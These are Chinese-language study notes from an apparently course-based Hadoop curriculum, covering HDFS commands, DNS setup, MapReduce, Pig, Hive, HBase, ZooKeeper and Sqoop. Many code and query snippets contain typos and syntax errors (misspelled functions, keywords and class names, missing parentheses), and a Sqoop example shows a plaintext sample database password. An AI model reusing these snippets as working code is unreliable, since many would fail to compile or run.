//校验和本身很消耗性能,使用的是jvm的软件进行软计算算的。可以直接改成cpu硬计算 //性能优化一般都会到jvm里面去操作 回收站 //如果打开的话需要先配置core-site.xml //测试 bin/hadoop fs -rmr ./in/test1.txt //会出现./Trash这个文件，相当于移到了回收站的目录 恢复和清空 mv 将.Trash的文件移回来就OK了 fs -expunge //清空 元数据保护 //配置多个副本会影响namenode处理速度，但是会增加安全性。 快照 HDFS文件操作 hadoop没有当前目录的概念，也没有cd命令，需要绝对地址 //查看HDFS下某个文件的内容 bin/hadoop fs -cat ./in/test1.txt //查看HDFS基本统计信息 bin/hadoop dfsadmin -report //HDFS是不能修改，下载到linux文件改完再传回去 怎么添加节点？ 在新节点安装好hadoop 把namenode的有关配置文件复制到该节点 修改masters和slaves文件，增加该节点 设置ssh免密码迕出该节点 单独启劢该节点上的datanode和tasktracker(hadoop-daemon.sh start datanode/tasktracker) 运行start-balancer.sh迕行数据负载均衡 //start-dfs.sh,不需要重启集群 java操作HDFS： URLCat.java public class URLCat{ static{ URL.setURLStreamHandlerFactory(new FsUrlStreamHandlerFactory()); } public static void main(String[] args) throws Exception{ inputStream in = null; try{ in = new URL(args[0]).openStream(); IOUtils.copyBytes(in,System.out,4096,false); }finally{ IOUtils.closeStream(in); } } } 设置Hadoop类目录 Hadoop-env.sh export HADOOP_CLASSPATH=xxxxx/myclass 设置搜索目录 ls -a //查看隐藏文件 .bash_profile //脚本 javac URLCat.java //会报错,因为没有import Hadoop的包 cd hadoop/lib //导入包之后还会报错，再指定classpath的jar路径就OK了 javac -classpath ../hadoop-core-1.1.2.jar URLCat.java bin/hadoop URLCat hdfs://backup01/usr/huang/in/test1.txt //运行jar //这里没有指定端口 bin/hadoop URLCat hdfs://backup01:9000/usr/huang/in/test1.txt 下载ant 下载参考书的代码并上传解开 7287OS_Code/ cd chapter2 cd HDFS_JAVA_API/ cd src 设置HADOOP_HOME环境变量 build.xml loaction=&quot;build&quot; //输出到build文件夹里 /home/huang/apache-ant-1.9.2/bin/ant //在HDFS_Java_API目录下执行 ~/hadoop-1.1.2/bin/hadoop jar HDFSJavaAPI.jar HDFSJavaAPIDemo C_API 安装gcc (c语言的编译器) yum -y install gcc gcc-c++ autoconf make 测试HDFS C_API hdfs_cpp_demo.c #inlude &quot;hdfs.h&quot; int main(int argc,char **argv){ hdfsFS fs = hdfsConnect(&quot;backup01&quot;,9000); if(!sf){ fprintrf(stderr,&quot;Cannot connect to HDFS.\n&quot;); exit(-1); } char* fileName = &quot;demo_txt&quot;; char* message=&quot;Welcome to HDFS C API!&quot;; int size = strlen(message); } //bin/tar.zz.mds 没有源码的包 个人配置的话 编译 gcc hdfs_app_demo.c \ -I $HADOOP_HOME/src/c++/libhdfs \ //-I 包含 -I $JAVA_HOME/include \ -I $JAVA_HOME/include/linux/ \ -L $HADOOP_HOME/c++/Linux-amd64-64/lib/ -lhdfs \ //-L 连接库的路径 -L $JAVA_HOME/jre/lib/amd64/server -ljvm \ -o hdfs_cpp_demo // -o 输出 利用之前ant输出设置CLASSPATH环境变量 要把Hadoop所有的jar包都列进去 利用ant打印环境变量 /home/xxx/ant print -cp export CLASSPATH=xxxxx //要在同一命令行下执行 LD_LIBRARY_PATH=$HADOOP_HOME/xxx/amd64/server ./hdfs_cpp_demo java解读： FileSystem public class FileSystemCat{ main() throws Exception{ String uri = args[0]; Configuration conf = new Configuration(); FIleSystem fs = FileSystem.get(URI.create(uri),conf); InputStream in = null; try{ in = fs.open(new Path(uri)); IOUtils.copyBytes(in,System.out,4096,false); //hadoop包的 }finally{ IOUtils.closeStream(in); } } } hadoop FileSystemCat hdfs://localhost/user/tom/quangle.txt //C程序可以查看hdfs.h这个文件了解API Hadoop 2.x (namenode不再是单点) HDFS HA 管理命令手册 块池 同一个datanode可以存着属于多个block pool的多个块 //hadoop_v4_02g hdfs-site.xml dfs.nameservices &lt;value&gt;ns1,ns2&lt;/value&gt; ... 格式化名称节点 HDFS快照 快照位置 hdfs dfs -ls /foo/.snapshot //note03 HDFS HA联邦安装 DNS安装 yum -y install bind bind-utils bind-chroot rpm -qa | grep &apos;^bind&apos; //查看是否安装成功 vim /etc/named.conf options{ listen-on port 53 { 127.0.0.1;}-&gt; { any; } allow-query {localhost;} -&gt; { any; } //对所有用户开放 } vim /etc/named.rfc1912.zones //末尾添加 zone &quot;hadoop.com&quot; IN { //正解区域 type master; file &quot;named.hadoop.com&quot;; allow-update { none; }; } zone &quot;0.168.192.in-addr.arpa&quot; IN { //反解区域 type master; file &quot;named.192.168.0.zone&quot;; allow-update { none; }; } cp -p named.localhost named.hadoop.com //复制的时候保持文件权限不变 vim named.hadoop.com IN SOA user3.hadoop.com. grid.user3.hadoop.com. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum IN NS user3.hadoop.com. user3.hadoop.com. IN A 192.168.0.109 user3.hadoop.com. IN A 192.168.0.110 user3.hadoop.com. IN A 192.168.0.111 user3.hadoop.com. IN A 192.168.0.112 user3.hadoop.com. IN A 192.168.0.113 user3.hadoop.com. IN A 192.168.0.114 [named] cp -p named.localhost named.192.168.0.zone vim named.192.168.0.zone IN SOA user3.hadoop.com. grid.user3.hadoop.com. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum IN NS user3.hadoop.com. 109 IN PTR user3.hadoop.com. 110 IN PTR user3.hadoop.com. 111 IN PTR user3.hadoop.com. 112 IN PTR user3.hadoop.com. 113 IN PTR user3.hadoop.com. 114 IN PTR user3.hadoop.com. //slave vim /etc/sysconfig/network-scripts/ifcfg-eth0 //末尾添加DNS服务器IP地址 DNS1=192.168.0.109 //在每台slave添加 service network restart service named start //启动DNS chkconfig named on //开机就将DNS服务启动 //检查 chkconfig --list named chkconfig --level 123456 named off tail -n /var/log/messages | grep named //测试主机名解析 nslookup user3.hadoop.com HDFS HA + 联邦 + Resource Manager HA //安装好DNS之后 cat /etc/resolv.conf //查看 nslookup www.dataguru.cn //测试 NFS (网络文件系统) 可以设置配置文件把某些目录共享出去，并可以设置权限 scp -rp ./hadoop-0.20.2 grid@h1:/home/grid awk脚本 awk &apos;{print $1}&apos; //awk 都用单引号,以空格/制表符分隔 ，一般处理表格等文件，reg：日志文件 awk &apos;$9~/rr/{print $9}&apos; //~包含 {}里面放执行语句 //除了awk，还要学sed cat slave h1 h2 h3 h4 h5 h6 cat ./slave | awk &apos;{print &quot;scp -rp ./hadoop-0.20.2 grid@&quot;$1&quot;:/home/grid&quot;}&apos; &gt; scp_test chmod a+x scp_test //变成可执行文件 sh ./scp_test //note04 MR //超级计算机结构是非开放的，每一台都是定制的 //reg：日志分析，通过hdfs切割成很多的块，分散到各个节点上，然后各个节点一起来并行计算，再把结果加起来 //并行计算框架 MPI c语言的函数库 计算密集型，算是瓶颈 PVM CUDA 英伟达配合显卡GPU推出来的包，利用GPU多核心来处理 BOINC 互联网计算（可以当分析志愿者） Map-Reduce 负担主要在I/O 云计算 目前流行的开源云计算解决方案 reg：气象数据集： zcat xxx-xx-x.gz //查看.gz文件 解压及合并： zcat *.gz &gt; sample.txt //按数据量大小来解压合并 分析MR input -&gt; |有偏移量key| -&gt; map -&gt; |(key,value)| -&gt; shuffle -&gt; |聚合操作| -&gt; reduce -&gt; |求value的最大值/平均值等| -&gt; output -&gt; hdfs Java MapReduce 通常需要3段程序 1.映射器 (从原始数据读成key，value)MaxTemperatureMapper 2.reducer（key,value变成最后需要的形式） MaxTemperatureReducer 3.作业程序,总调度 MaxTemperature 运行MR cd myclass //讲课创建的jar测试目录 cat MaxTemperatureMapper.java cat MaxTemperature.java cat MaxTemperatureReducer.java javac -classpath ../hadoop-core-1.1.2.jar *.java ../bin/hadoop MaxTemperature ./user/huang/in/723440-13964 ./out6 //数据文件. 输出到out6 //没有找到Mapper，解决方式，打成jar包 jar cvf ./MaxTemperature.jar *.class mv MaxTemperature.jar .. //需要删掉之前的class文件 rm *.class cd .. bin/hadoop jar ./MaxTemperature.jar MaxTemperature ./user/huang/in/723440-13964 ./out6 ../bin/hadoop fs -ls ./out6 ../bin/hadoop fs -cat ./out6/part-r-00000 //分析计算过程 Mapper public void map(LongWritable key,Text value,Context context) throws IOException,InterruptedException{ String line = value.toString(); String year = line.substring(15,19); int airTemperature; if(line.charAt(87) == &apos;+&apos;){ //parseInt doesn&apos;t like leading plus signs airTemperature = Integer.parseInt(line.substring(88,92)); }else{ airTemperature = Integer.parseInt(line.substring(87,92)); } String quality = line.substring(92,93); if(airTemperature != MISSING &amp;&amp; quality.matches(&quot;[01459]&quot;)){ context.write(new Text(year),new IntWritable(airTemperature)); } } Reducer public class MaxTemperatureReducer extends Reducer&lt;Text,IntWritable,Text,IntWritable&gt;{ @Override public void reduce(Text key,Iterable&lt;IntWritable&gt; values,Context context) throws IOException,InterruptedException{ int maxValue = Integer.MIN_VALUE; for(IntWritable value:values){ maxValue = Math.max(maxValue,value.get(); } context.write(key,new IntWritable(maxValue)); } } M-R job public class MaxTemperature{ main() throws Exception{ if(args.length != 2){ System.err.println(&quot;Usage:MaxTemperature&lt;input path&gt; &lt;output path&gt;&quot;); System.exit(-1); } Job job = new Job(); job.setJarByClass(MaxTemperature.class); job.setJobName(&quot;Max temperature&quot;); FileInputFormat.addInputPath(job,new Path(args[0])); FileOutputFormat.setOutputPath(job,new Path(args[1])); job.setMapperClass(MaxTemperatureMapper.class); job.setReducerClass(MaxTemperatureReducer.class); job.setOutputKeyClass(Text.class); job.setOutputValueClass(IntWritable.class); System.exit(job.waitForCompletion(true)?0:1); } } 分片的问题 Combiner 做预计算的。 Map-Reduce工作机制 //java跟c相比，慢的是启动jvm这个过程。jvm启动不挂的话还是很快的 有一个心跳是3秒一次，jobtracker周期是1分钟一次 主要工作：SQL或PL/SQL改写为Map-Reduce程序 Eclipse: hadoop/contrib/eclipse-plugin/xxx.jar windows-&gt;preferences-&gt;hadoop map/reduce show Map-Reduce 显示MR视图 在视图右键-&gt;new Hadoop loaction-&gt; Location name:xxx hadoop/conf/mapred-site.xml -&gt;找端口 端口填写一致 左侧右键DFS Loactions-&gt;Disconnect-&gt;home user new -&gt; MapReduce Project -&gt; name:xxx src-&gt;new example.java @Override public int run(String[] args)throws Exception{ Configuration conf = getConf(); Job job = new Job(conf,&quot;example&quot;); //任务名 job.setJarByClass(example.class); //指定Class FileInputFormat.addInputPath(job,new Path(args[0])); //输入路径 FileOutputFormat.setOutputPath(job,new Path(args[1])); //输出路径 job.setMapperClass(Map.class); //调用上面Map类作为Map任务代码 job.setReducerClass(Reduce.class); //调用上面Reduce类作为Reduce任务代码 job.setOutputFormatClass(TextOutputFormat.class); //指定输出的KEY的格式 job.setOutputKeyClass(Text.class); //指定输出的KEY的格式 job.setOutputValueClass(Text.class); //指定输出的VALUE的格式 job.waitForCompletion(true); return job.isSuccessful()?0:1; } main(){ int res = ToolRunner.run(new Configuration(),new example(),args); System.exit(res); } 源文件: -&gt; Mapper 1.分割原始数据 2.输出所需数据 3.处理异常数据 -&gt; 输出到HDFS public class Test_1 extends Configured implements Tool{ enum Counter{ //可以对其自增操作 LINESKIP, //出错的行 } public static class Map extends Mapper&lt;LongWritable,Text,NullWritable,Text&gt;{//变量为: 输入,输出key,value格式 //Text主要记录字符串的,NullWritable 空值 //key 偏移量 ，内容 value public void map(LongWritable key,Text value,Context context) throws IOException,InterruptedException{ String line = value.toString(); //读取源数据 try{ //数据处理 String[] lineSplit = line.split(&quot; &quot;); String month = lineSplit[0]; String time = lineSplit[1]; String mac = lineSplit[6]; Text out = new Text(month + &apos;&apos; + time + &apos;&apos; + mac); //如果是context.write(key,out);则会出现\t //用了NullWritable.get() 之后不会出现 \t context.write(NullWritable.get(),out);//输出 key \t value }catch(java.lang.ArrayIndexOutOfBoundsExecption e){ context.getCounter(Counter.LINESKIP).increment(1);//出错令计数器+1 return; } } } @Override public int run(String[] args)throws Exception{ Configuration conf = getConf(); Job job = new Job(conf,&quot;example&quot;); //任务名 job.setJarByClass(Test_1.class); //指定Class FileInputFormat.addInputPath(job,new Path(args[0])); //输入路径 FileOutputFormat.setOutputPath(job,new Path(args[1])); //输出路径 job.setMapperClass(Map.class); //调用上面Map类作为Map任务代码 job.setReducerClass(Reduce.class); //调用上面Reduce类作为Reduce任务代码 job.setOutputFormatClass(TextOutputFormat.class); //指定输出的KEY的格式 job.setOutputKeyClass(Text.class); //指定输出的KEY的格式 job.setOutputValueClass(Text.class); //指定输出的VALUE的格式 job.waitForCompletion(true); return job.isSuccessful()?0:1; } main(){ //运行任务 int res = ToolRunner.run(new Configuration(),new Test_1(),args); System.exit(res); } } Run_Configurations-&gt;Test_1-&gt;Arguments: hdfs://localhost:9000/user/james/input hdfs://localhost:9000/user/james/output //output必须是不存在的 倒排索引 new-&gt;Haodoop Project-&gt;Test_2 public calss Test_2 extends Configured implements Tool{ enum Counter{ LINESKIP } public static class Map extends Mapper&lt;LongWritable,Text,Text,Text&gt;{//变量为: 输入,输出格式 String line = value.toString(); try{ //数据处理 String[] lineSplit = line.split(&quot; &quot;);//135,10085 String anum = lineSplit[0]; String bnum = lineSplit[1]; context.write(new Text(bnum),new Text(anum)); }catch(java.lang.ArrayIndexOutOfBoundsExecption e){ context.getCounter(Counter.LINESKIP).increment(1);//出错令计数器+1 return; } } public static class Reduce extends Reducer&lt;Text,Text,Text,Text&gt;{ public void reduce(Text key,Iterable&lt;Text&gt; values,Context context)throws IOException,InterruptedException{ String valueString; String out = &quot;&quot;; for (Text value:values){ valueString = value.toString(); out += valueString + &quot;|&quot;; } context.write(key,new Text(out)); } } run(){ job.setReducerClass(Reduce.class); } main(){} } Export-&gt;JAR-&gt;JAR file path-&gt;next-&gt;Main Class填写-&gt;Clone //note05 MR实战 性能调优： 究竟需要多个reducer？ 输入：大文件(上G的）优于小文件 减少网络传输：压缩map的输出 优化每个节点能运行的任务数：mapred.tasktracker.map.tasks.maximum和mapred.tasktracker.reduce.tasks.maximum(缺省值均为2) hadoop流与脚本 wordcount: //数单词 cat install.log | wc web Apache日志分析： PV IP 图片/日志点击先区分开 爬虫/日志点击区分开 //排除爬虫 探针设计 //在网站点击一下,只用算法排除的话，依然是多出3-5倍无用点击 //不直接分析网站日志，而是间接分析探针日志，来计算pv &lt;script type=&quot;text/javascriopt&quot;&gt; var _gaq = _gaq || []; _gaq.push([&apos;_setAccount&apos;,&apos;UA-20237423-4&apos;]); _gaq.push([&apos;_setDomainName&apos;,&apos;.itpub.net&apos;]); _gaq.push([&apos;_trackPageview&apos;]); (function(){ var ga = document.createElement(&apos;script&apos;); ga.type = &apos;text/javascript&apos;; ga.async = true; ga.src = (&apos;https:&apos; == doucment.location.protocol? &apos;https://ssl&apos;:&apos;http://www&apos;) + &apos;.google-a???&apos;; var s = document.getElementsByTagName(&apos;script&apos;)[0]; s.parentNode.insertBefore(ga,s); })(); &lt;/script&gt; &lt;div style=&quot;display:none&quot;&gt; &lt;script type=&quot;text/javascript&quot;&gt; var _bdhmProtocol = ((&quot;https:&quot; == document.location.protocol) ? &quot;https://&quot; : &quot;http://&quot;); document.write(unescape(&quot;%3Cscript src=&apos;&quot; + _bdhmProtocol + &quot;hm.baidu.com/h.js%3F5016281862f595e78&quot;)); &lt;/script&gt;&lt;/div&gt; &lt;!-- END STAT PV --&gt;&lt;/body&gt; &lt;/html&gt; 排除爬虫和程序点击，对抗作弊 ·用鼠标测动对抗爬虫 ·常用流量作弊手段 ·跟踪用户 ### 一边点击一边换IP ### 拿搜索词 ？？纯真88 统计浏览器类型 少量数据的情况下： awk,grep,sort,join等,perl,python,正则等 海量数据的情况下： 10G,100G 增长的时候 CDN (反向代理加速) ip去重 //note06 复杂应用/hadoop流 InputFormat() OutputFormat() // 06 hadoop_v4_06c 04:00 //note07 Pig set命令检查环境变量 进入grunt shell pig -x local PIG_CLASSPATH pig Pig的运行方法： 脚本 Grunt 嵌入式 pig转换为java，再由jvm执行 Grunt 自动补全机制 Autocomplete文件 Eclipse插件PigPen help ls,cat,cd copyToLocal test1.txt ttt (复制到grunt外面的当前路径) sh /usr/java/jdk1.7.0.0_26/bin/jps //直接执行命令 Bag,Tuple,Field,Pig不要求具有各tuple相同数量或相同类型的field pig -x local A = LOAD &apos;/home/grid/csdn.txt&apos; USING PigStorage(&apos;#&apos;) B = FOREACH A STORE B INTO &apos;/home/grid/emmail.txt&apos; USING PiagStorage(); 脚本： grunt&gt; records = LOAD &apos;input/ncdc/micro-tab/sample.txt&apos; &gt;&gt; AS (year:chararray,temperature:int,quality:int); //如果没有定义分隔符，则默认是制表符。 DUMP records; //输出 DESCRIBE records; //输出查看结构 filtered_records = FILTER records BY temperature != 9999 AND &gt;&gt; (quality == 0 OR quality == 1 OR quality == 4 OR quality == 5 OR quality == 9); DUMP filtered_records; GROUP FOREACH //对每一行进行扫描处理 //有点类似面向数据流的处理语言，Mapp-Reduce有点面向计算 UDF 用户自定义函数 guoyunsky.iteye.com/blog/1317084 reg: pig cat score.txt A = LOAD &apos;score.txt&apos; USING PigStorage(&apos;,&apos;) AS (student,course,teacher,score:int); DESCRIBE A; B = FOREACH A CENERATE student,teacher; DESCRIBE B; C = DISTINCT //去重 C = DISTINCT B; D = GROUP C BY student; D = FOREACH (GROUP C BY student) CENERATE group AS student,COUNT(C); DUMP D; //第二种方法 DESCRIBE B; E = GROUP B BY student; DESCRIBE E F = FOREACH E { T = B.teacher; uniq = DISTINCT T; GENERATE group AS student,COUNT(uniq) AS cnt; } //note08 Hive 数据仓库工程师 NoSQL -&gt; Not Only SQL Hive安装 配置文件 cd hive/conf hive-env.sh.template -&gt; hive-env.sh HADOOP_HOME=xxx export HIVE_CONF_DIR=xxx hive-site.xml hadoop-env.sh export HADOOP_CLASSTHAN= xxx; ./hive show tables create table abc (c1 string); drop table abc; /user/hive/warehouse/abc/数据 insert overwrite table result select xxx frrom loc thrift server / JDBC reg: main()throws Exception{ CLass.forNmae(&quot;org.apache.hadoop.hive.jdbc.HiveDriber&quot;); String dropSql=&quot;drop table pokes&quot;; String createSql=&quot;create table pokes (foo int,bar string&quot;; String insertSql=&quot;load data local inpath &apos;/home/zhangxin/hive/kv1.txt&apos; overwrite into table pokes&quot;; String querySql=&quot;select bar from pokes limit 5&quot;; Connection connection=DriverManager.getConnection(&quot;jdbc:hive://localhost:10000/default&quot;,&quot;&quot;,&quot;&quot;); Statement statement = connection.createStatement(); statement.execute(dropSql); statement.execute(createSql); statement.execute(insertSql); ResultSet rs = statement.executeQuery(querySql); while(rs.next()){ sout(rs.getString(&quot;bar&quot;)); } } http://10.20.151.7:9999/hwi/ //ip改成自己的，默认web路径访问 元数据 //note09 Hive sql不同的，有3种独特的类型 struct map array reg: create table employees( name STRING, salary FLOAT, subordinates ARRAY&lt;STRING&gt;, deductions MAP&lt;STRING,FLOAT&gt;, address STRUCT&lt;street:STRING,city:STRING,state:STRING,zip:INT&gt; ); 缺省分隔符： \n ^A \001 分离不同的列(字段) ^B \002 分割数组/集合里面的元素 ^C \003 map的key，value之间分割 create table employees( xxx ) ROW format delimited fields terminated by &apos;\001&apos; collection items terminated by &apos;\002&apos; map keys terminated by &apos;\003&apos; lines terminated by &apos;\n&apos; stored as textfile; DDL: create database if not exists financials; show databases like &apos;h.*&apos;; 存放目录 缺省存放目录由hive.metastore.warehouse.dir指定 可以使用以下命令覆盖 create database financials location &apos;/my/preferred/directory&apos; 观看数据库描述 create database financials comment &apos;Holds all financial tables&apos;; describe database financials; create database financials with dbproperties(&apos;creator&apos;=&apos;Mark Moneybags&apos;,&apos;date&apos;=&apos;2012-01-02&apos;); describe database extended financials; 切换数据库 USE financials; set hive.cli.print.current.db=true; hive (financials)&gt; USE default; hive (default)&gt; set hive.cli.print.current.db=false; hive&gt; ... 删除和更改数据库 drop database if exists financials; drop database if exists financials cascade; //连数据一起删掉 alter database financials set dbproperties(&apos;edited-by&apos;=&apos;Joe&apos;); 创建表 create table employees( name STRING comment &apos;Employee name&apos;, salary FLOAT comment &apos;Employee salary&apos;, subordinates ARRAY&lt;STRING&gt; comment &apos;Names of xx&apos;, deductions MAP&lt;STRING,FLOAT&gt;, address STRUCT&lt;street:STRING,city:STRING,state:STRING,zip:INT&gt; ) comment &apos;Description of the table&apos; tblproperties(&apos;creator&apos;=&apos;Mark Moneybags&apos;,&apos;date&apos;=&apos;2012-01-02&apos;) location &apos;/user/hive/warehouse/mydb.db/employees&apos;; create table if not exists mydb.employees2 like mydb.employees; 列出表 USE mydb; show tables; use default; show tables in mydb; use mydb; show tables &apos;empl.*&apos; 观看表的描述 describe extended mydb.employees; 外部表 create table employees( name STRING comment &apos;Employee name&apos;, salary FLOAT comment &apos;Employee salary&apos;, subordinates ARRAY&lt;STRING&gt; comment &apos;Names of xx&apos;, deductions MAP&lt;STRING,FLOAT&gt;, address STRUCT&lt;street:STRING,city:STRING,state:STRING,zip:INT&gt; ) row format delimited fields terminated by &apos;,&apos; location &apos;/data/stocks&apos;; create external table if not exists mydb.employee3 like mydb.employees location &apos;/path/to/data&apos;; 分区表： create table employees( xxx ) partitioned by (country STRING,state STRING); 分区表的存储：会变成一个子目录里面的一系列文件 set hive.mapred.mode=strict; select e.name,e.salalry from employees e limit 100; //报错，然后 set hive.mapred.mode=nonstrict; select e.name,e.salalry from employees e limit 100; 指定存储格式 create table kst partitioned by (ds string) row format serde &apos;com.linkedin.haivvreo.AvroSerDe&apos; with serdeproperties (&apos;schema.url&apos;=&apos;http://schema_provider/kst.avsc&apos;) stored as inputformat &apos;com.linkedin.haivvreo.AvroContainerInputFormat&apos; outputformat &apos;com.linkedin.haivvreo.AvroContainerOutputFormat&apos;; create external table if not exists stocks( xxx ) clustered by (exchange,symbol) sorted by (ymd asc) into 96 buckets 删除和更改表 alter table log_messages partition(year=2011,month=12,day=2) set location &apos;s3n://ourbucket/logs/2011/01/02&apos;; alert table log_messages set tblproperties(&apos;notes&apos;=&apos;The xxxx&apos;); 列操作 alter table log_messages change column hms hours_minutes_secondes int comment &apos;xx&apos; after severity; alter table log_messages add columns( app_name STRING); alter tbal log_messages replace columns(message STRING); DML操作 Hive不支持行级别，将数据放入表中的唯一办法是批量载入 LOAD DATA LOCAL inpath &apos;{env:HOME}/california-employees&apos; overwrite into table employees partition(country = &apos;US&apos;,state=&apos;CA&apos;); Insert overwrite语句 insert overwrite table employees partition(country=&apos;US&apos;) select * from staged_employees se where se.cnty=&apos;US&apos; from staged_employees se //非分区表 insert overwrite table employees partition (country=&apos;US&apos;) select * from xxx s where s.cnty=&apos;US&apos; //将非分区的表变成了分区表 动态分区插入 set hive.exec.dynamic.partition=true; set hive.exec.dynamic.partition.mode=nonstrict; set hive.exec.max.dynamic.partitions.pernode=1000; 创建表的同时把数据放进去 create table ca_employees as select name,salary,address from employees where se.state=&apos;CA&apos;; 导出数据 直接复制粘贴 如果需要改动数据格式，可以使用insert overwrite insert overwrite local directory &apos;/tmp/ca_employees&apos; select name,salary,address from employees where se.state = &apos;CA&apos;; SELECT: 使用正则表达式 select symobl,&apos;price.*&apos; from stocks; select name from employees where address.street like &apos;%Ave.&apos; select name,address.street from employees where address.street rlike &apos;.*(Chicage|Ontario).*&apos;; //rlike 来正则匹配 函数 //求各种统计指标的函数 explode //可以把数组元素展开成很多行 select explode(array(1,2,3)) as element from src; 嵌套select from ( select upper(name),deductions[&quot;Federal Taxes&quot;] as fed_taxes from employees ) e select e.name,e.salary_minus_fed_taxes where e.salary_minus_fed_taxes &gt; 70000; 连接操作(缓慢) set hive.auto.convert.join=true; select s.ymd,s.symbol,s.price_close,d.dividend from stocks s join dividends d on s.ymd = d.ymd and s.symbol = d.symbol where s.symbol=&apos;AAPL&apos; 排序 order by and sort by distribute by cluster by bucket : 桶 hash (抽样查询) select * from numbers TABLESAMPLE(BUCKET 3 OUT OF 10 ON rand())s; 视图与索引 create index employees_index on tbale employees(country) as &apos;org.apache.hadoop.hive.ql.index.compact.CompactIndexHandler&apos; with deferred rebuild idxproperties(&apos;creator = &apos;me&apos;,&apos;created_at&apos;=&apos;some_time&apos;) in table employees_index_table partitioned by (country,name) comment &apos;Employees indexd by country and name.&apos;; 位图索引 建模 执行计划 Google Dremel 山寨货：Apache Drill Cloudera Impala （Hive的替代方案） yarm是底层 架构在yarm上面就可以不用map-reduce了，可以用hadoop流什么的 //note10 Hive-impala子项目 HBase  Google Bigtable的开源实现  列式数据库  可集群化  可以使用shell、web、api等多种方 式访问  适合高读写(insert)的场景  HQL查询语言  NoSQL的典型代表产品 //不是使用的SQL语言 mysql是什么东西限制了其扩展，noSQL怎么解决的这个问题 Sqoop 用于在Hadoop和关系型数据库之间交换数据 通过JDBC接口连入关系型数据库 Avro 数据序列化工具 Chukwa 架构在Hadoop之上的数据采集与分析框架 主要进行日志采集和分析 Cassandra （几乎淘汰） 与Hbase类似，借鉴Google Bigtable的思想体系 特点：无中心的数据库 缺点：效率比较低 Zookeeper： //还是一个资源库 文件没有上下级之分 znode可以存放data，上限1M；还可以放ACL，访问控制列表。 一般是奇数个节点，节点都是平等的，表面看起来zookeeper是无中心的但是会选举一个出来。 zab协议 阶段1:领导者选举 阶段2:原子广播 每个节点放一个watch，leader修改了信息后其他节点可以查看到修改的信息，并更改自己的信息 分布锁： znode---leader -&gt; lock 观察 羊群效应 //note11 zookeeper Big Table想法： (S#,sn,sd,sa) /* 1.行列：key值 2.属性 3.value */ hbase 删除不是正常删，而且给某个时间戳的一行插入一个新的行键打个标记作为删除 （HDFS不能进行文件修改，追加也很麻烦，Hbase做了一个折中的方式来insert。所有数据都是往内存里面插，在一定时间内存满了之后才可以写，即收集一定数据后就可以往里写，一写就是一块。）（Hbase每隔一段时间进行重整操作，会把一些比较小的时间拿出来合并成比较大的文件。抛弃是在重整操作过程中操作的，打标记的都扔掉，然后再重新写成一个大的文件。） 行键也是可以重复的 面向时间查询 行键 列族与列 时间戳 可以由用户显式赋值 行键，列族：限定符，时间戳 来唯一决定 列族元素在物理上存放的是同一个地方，不同的列族是不同的物理存放 store memoryStore (先) storeFile (后) 当内存里面的东西足够多时会存到storeFile（物理） 读取是在memoryStore里面的 每过一段时间会触发合并过程，会把小的storeFile合并成大的storeFile，合并过程中会删除标记的行及过期的行 每一个storeFile对应一个HDFS的文件，会分散在不同的物理节点里面 Region和Region服务器 HLog -ROOT-和.META.表  HBase中有两张特殊的Table，-ROOT-和.META.  Ø .META.:记录了用户表的Region信息，.META.可以有多个regoin  Ø -ROOT-:记录了.META.表的Region信息，-ROOT-只有一个region  Ø Zookeeper中记录了-ROOT-表的location Memstore与storeFile 一个store包含一个列族的所有数据，列族存放是在临近的区域里面 传统数据库的行式存储 为了读某个列的数据，必须要把整个行读完才能对其读取 联机事务处理随机读写还是要用行式数据库。 行式数据库存储问题 行标识访问：B树索引 B树索引原理：树形 oracle行式存储的访问形式 BigTable的LSM索引 （日志及数据） L：log S：结构 M：merge（合并） 日志就是数据 zookeeper： 安装：单机模式 配置 安装：集群模式 hadoop与hbase版本问题 hbase-&gt;hadoop-core-x.x.x.jar //可以看hadoop匹配版本 修改hbase-env.sh 配置hbase-site.xml 启动Hbase及验证 bin/start-hbase.sh /usr/java/jdk1.6.0_26/bin/jps Hbase安装：伪分布模式 编辑hbase-env.sh增加HBASE_CLASSPATH环境变量 编辑hbase-site.xml打开分布模式 覆盖hadoop核心jar包 Hbase安装：完全分布模式 192.168.5.134:60010/master.jsp //note12 Hbase操作命令复杂 Hbase数据建模问题 关系型数据库的弱点 CAP定律： NoSQL运动 NoSQL数据库家族 redis一半内存一半硬盘 列式数据库在数据分析时工作特别快 满足一致性，可用性的系统 Redis key-value类型的数据库 Hbase 不能group by等连接 Cassandra MongoDB 擅长处理非结构化数据 Neo4J 适用于社交网站 NoSQL与CAP 密切相关的。真的要做成分布式的话必须要在其中放弃一种，一般都选一致性 Hbase存储架构理解 Key Length Value Length Key Value //key,value的长度比较重要 什么情况下使用Hbase？  成熟的数据分析主题，查询模式已经确立并且不轻易改变  传统的关系型数据库已经无法承受负荷，高速插入，大量读取  适合海量的，但同时也是简单的操作(例如key-value) 关系型数据库的困难 模式设计 Hbase:表设计与查询实现 搜索优化： u-t t-u 辅助索引 复合行键设计 //note13 数据集成 Sqoop mysql hadoop 连接 Flume Chukwa 日志收集 ODCH/OLH oracle hadoop 连接 Oracle大数据连接器 Sqoop SQL-to-HDFS工具 JDBC hadoop-0.20.2下Squoop是不支持此版本的 配置 sqoop命令选项： % sqoop help % sqoop help import 从mysql导入数据的例子 % sqoop import --connect jdbc:mysql://localhost/hadoopguide \ //连入mysql &gt;--table widgets -m 1 % hadoop fs -cat widgets/part-m-00000 //间隔符用的， 导入到Hbase sqoop import --connect jdbc:mysql//mysqlserver_IP/databaseName --table datatable --hbase-create-table --hbase-table hbase_tablename --column-family col_fam_name --hbase-row-key key_col_name 其中，databaseName和datatable是mysql的数据库和表名，hbase_tablename是要导成hbase的表名，key_col_name可以指定datatable中哪一列作为hbase新表的rowkey,col_fam_name是除rowkey之外的所有列的列族名 从oracle导入数据 需要有ojdbc6.jar放在$SQOOP_HOME/lib里，不需要添加到classpath connecturl=jdbc:oracle:thin:@172.7.10.16:1521:orcl oraclename=scott oraclepassword=wang123456 oracleTableName=test #需要从oracle中导入的表中的字段名 columns=ID,STATE #导出到HDFS后的存放路径 hdfsPath=/tmp/ sqoop import --append --connect $CONNECTURL --username $ORACLENAME --password $ORACLEPASSWORD --m 1 --table $oracleTableName --columns $columns --hbase-create-table --hbase-table orl --hbase-row-key STATE --column-family orl oracle big data connectors HDFS直接连接器 可以把带有分隔符的文件作为oracle的外部表访问 还可以直接hadoop的文本文件作为数据源 hadoop装载器 直接把hadoop里面的东西装载过去 Oracle HDFS直接连接器(ODCH)实验 Oracle 